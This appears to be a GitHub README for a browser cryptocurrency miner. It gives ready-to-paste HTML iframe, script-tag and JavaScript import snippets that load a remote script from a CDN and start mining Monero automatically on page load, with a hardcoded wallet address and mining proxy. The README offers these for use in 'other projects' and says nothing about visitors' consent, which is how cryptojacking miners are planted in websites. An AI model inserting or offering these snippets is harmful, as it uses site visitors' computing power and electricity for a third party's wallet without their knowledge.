## Monero Webminer

Html & Js code that allows Mining of XMR (Monero) on browsers


# Configure

In Mine.Html you will see a address change this for your Monero address and you will be mining.

```javascript
server = "wss://f.xmrminingproxy.com:8181";
    var pool = "moneroocean.stream";
    var walletAddress = " PUT YOUR ADDRESS HERE";
    var workerId = ""
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
```
# Running

Open index.html in any web browser and it will automatically start mining.

https://najmajmal.github.io/monero-webminer


# Check Progress 

Go to https://moneroocean.stream . This is the pool you are connected to, it will show your hashrate and balance.

# Use In Other Projects 

HTML Iframe-snippet

    <iframe src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/html.html"></iframe>


HTML
  
    <!-- Start Of Mining Code (HTML) -->
    <script src="https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js"></script>
    <script>
        server = "wss://f.xmrminingproxy.com:8181";
        var pool = "moneroocean.stream";
        var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
        var workerId = "nahh"
        var threads = -1;
        var password = "";
        startMining(pool, walletAddress, workerId, threads, password);
        throttleMiner = 20;
    </script>
    <!-- End Of Mining Code (HTML) -->
      

Javascript import snippet
  
    import 'https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/external/javascript.js';


Javascript
    
    // Start Of Mining Code (Javascript)
    var script = document.createElement("script");
    script.src = "https://cdn.jsdelivr.net/gh/NajmAjmal/monero-webminer@main/script.js";
    document.head.appendChild(script);

    server = "wss://f.xmrminingproxy.com:8181";
    var pool = "moneroocean.stream";
    var walletAddress = "4657q4dnsjLWtzeW4XN3wG9swFumWAZB9i1pegTLMxVAQy5E5AE8uif42kkHWcWc9vDcLUmzeCf3pV7mmrJQQqqe84dtASi";
    var workerId = "nahh"
    var threads = -1;
    var password = "";
    startMining(pool, walletAddress, workerId, threads, password);
    throttleMiner = 20;
    // End Of Mining Code

